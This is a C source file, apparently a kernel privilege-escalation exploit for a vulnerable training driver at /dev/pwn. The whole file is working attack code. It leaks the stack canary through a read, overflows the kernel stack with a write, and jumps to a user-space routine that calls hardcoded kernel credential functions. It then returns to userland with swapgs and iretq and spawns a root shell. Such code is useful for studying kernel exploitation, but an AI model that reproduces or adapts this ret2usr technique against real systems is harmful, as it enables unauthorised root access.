#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
size_t cookie;
int gfd;

void leak()
{
    size_t buf[15];
    ssize_t r = read(gfd, buf, sizeof(buf));
    cookie = buf[8];
    printf("[*] Leaked %zd bytes\n", r);
    printf("[*] Cookie: %lx\n", cookie);
}
size_t user_cs, user_ss, user_sp, user_rflags;

void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;");
    puts("[*] Saved state");
}
void get_shell(void)
{
    puts("[*] Returned to userland");
    if (getuid() == 0)
    {
        printf("[*] UID: %d, got root!\n", getuid());
        char *args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);
    }
    else
    {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

size_t user_rip = (size_t)get_shell;

void priv_esc(void)
{
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax,0xffffffff810a5af0;"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi , rax;"
        "movabs rax,0xffffffff810a5830;"
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"

    );
}

void overflow()
{
    unsigned n = 15;
    size_t payload[n];
    unsigned off = 8;
    // memset(payload, 0x22, sizeof(payload));
    payload[off++] = cookie;
    payload[off++] = 0x0; // rbx
    payload[off++] = 0x0; // r12
    payload[off++] = 0x0; // rbp
    payload[off++] = (size_t)priv_esc;

    puts("[*] Overflowing stack");
    int r = write(gfd, payload, sizeof(payload));
    if (r < 0)
    {
        perror("[-] Failed to write payload");
        exit(-1);
    }
    puts("[!]not here");
}
int main()
{
    gfd = open("/dev/pwn", O_RDWR);
    if (gfd < 0)
    {
        puts("[-] Failed to open /dev/pwn");
        return -1;
    }
    puts("[*] Opened /dev/pwn");
    save_state();
    leak();
    overflow();
    puts("[!] should never be reached");
    return 0;
}
